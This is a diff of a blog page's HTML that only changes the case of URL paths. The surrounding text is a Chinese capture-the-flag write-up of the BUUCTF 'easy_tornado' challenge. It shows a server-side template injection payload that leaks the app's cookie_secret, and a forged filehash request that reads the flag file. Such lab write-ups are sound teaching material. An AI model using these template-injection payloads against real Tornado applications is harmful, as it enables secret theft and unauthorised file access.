@@ -501,19 +501,19 @@ md5(cookie_secret+m">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>打开环境<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/1.jpg" alt=""></p>
+                <p>打开环境<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-easy-tornado/1.jpg" alt=""></p>
 <a id="more"></a>
 <p>有三个页面，挨个访问看看</p>
 <pre class=" language-bash"><code class="language-bash">/flag.txt</code></pre>
-<p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/2.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-easy-tornado/2.jpg" alt=""></p>
 <pre class=" language-bash"><code class="language-bash">/welcome.txt</code></pre>
-<p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/3.jpg" alt=""></p>
+<p><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-easy-tornado/3.jpg" alt=""></p>
 <pre class=" language-bash"><code class="language-bash">/hints.txt</code></pre>
-<p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/4.jpg" alt=""><br>开始分析<br>第一个页面告诉我们flag in /fllllllllllllag<br>hint告诉我们</p>
+<p><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-easy-tornado/4.jpg" alt=""><br>开始分析<br>第一个页面告诉我们flag in /fllllllllllllag<br>hint告诉我们</p>
 <pre class=" language-bash"><code class="language-bash">md5<span class="token punctuation">(</span>cookie_secret+md5<span class="token punctuation">(</span>filename<span class="token punctuation">))</span></code></pre>
 <p>也就是filename的md5值加上cookie_secret再md5<br>我们想要进入到fllllllllllllag，filename已经知道了，剩下cookie_secret不知道<br>在测试的过程中，会出现这样一个页面</p>
 <pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg<span class="token operator">=</span>Error</code></pre>
-<p>通过百度知道<br>tornado是python中的一个web应用框架<br>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。<br>再加上error?msg=Error这个页面<br>怀疑存在<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击(SSTI)</a><br>经过测试，确实存在模板注入<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/5.jpg" alt=""><br>然后通过查阅各种资料，发现对于tornado框架存在附属文件handler.settings<br>(<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a>)<br>payload为</p>
+<p>通过百度知道<br>tornado是python中的一个web应用框架<br>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。<br>再加上error?msg=Error这个页面<br>怀疑存在<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击(SSTI)</a><br>经过测试，确实存在模板注入<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-easy-tornado/5.jpg" alt=""><br>然后通过查阅各种资料，发现对于tornado框架存在附属文件handler.settings<br>(<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a>)<br>payload为</p>
 <pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>handler.settings<span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
 <p>得到cookie_secret</p>
 <pre class=" language-bash"><code class="language-bash"><span class="token string">'cookie_secret'</span><span class="token keyword">:</span> <span class="token string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span><span class="token punctuation">}</span></code></pre>
@@ -534,7 +534,7 @@ md5(cookie_secret+m">
 <pre class=" language-bash"><code class="language-bash">16a4ec873339e7847bf28e0e0b33803e</code></pre>
 <p>然后构造payload为</p>
 <pre class=" language-bash"><code class="language-bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/file?filename<span class="token operator">=</span>/fllllllllllllag<span class="token operator">&amp;</span>filehash<span class="token operator">=</span>16a4ec873339e7847bf28e0e0b33803e</code></pre>
-<p>得到flag<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/6.jpg" alt=""></p>
+<p>得到flag<br><img src="/LawlietLW.github.io/2019/12/21/BUUCTF-easy-tornado/6.jpg" alt=""></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -578,7 +578,7 @@ md5(cookie_secret+m">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://LawlietLW.github.io/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/">http://LawlietLW.github.io/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/</a>
+                    <a href="http://LawlietLW.github.io/LawlietLW.github.io/2019/12/21/BUUCTF-easy-tornado/">http://LawlietLW.github.io/LawlietLW.github.io/2019/12/21/BUUCTF-easy-tornado/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -791,7 +791,7 @@ md5(cookie_secret+m">
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/LawlietLW.github.io/2019/12/21/buuctf-easysql/">
+                <a href="/LawlietLW.github.io/2019/12/21/BUUCTF-EasySQL/">
                     <div class="card-image">
                         
                         
@@ -853,7 +853,7 @@ md5(cookie_secret+m">
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/LawlietLW.github.io/2019/12/21/buuctf-qiang-wang-bei-sui-bian-zhu/">
+                <a href="/LawlietLW.github.io/2019/12/21/BUUCTF-%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
                     <div class="card-image">
                         
                         
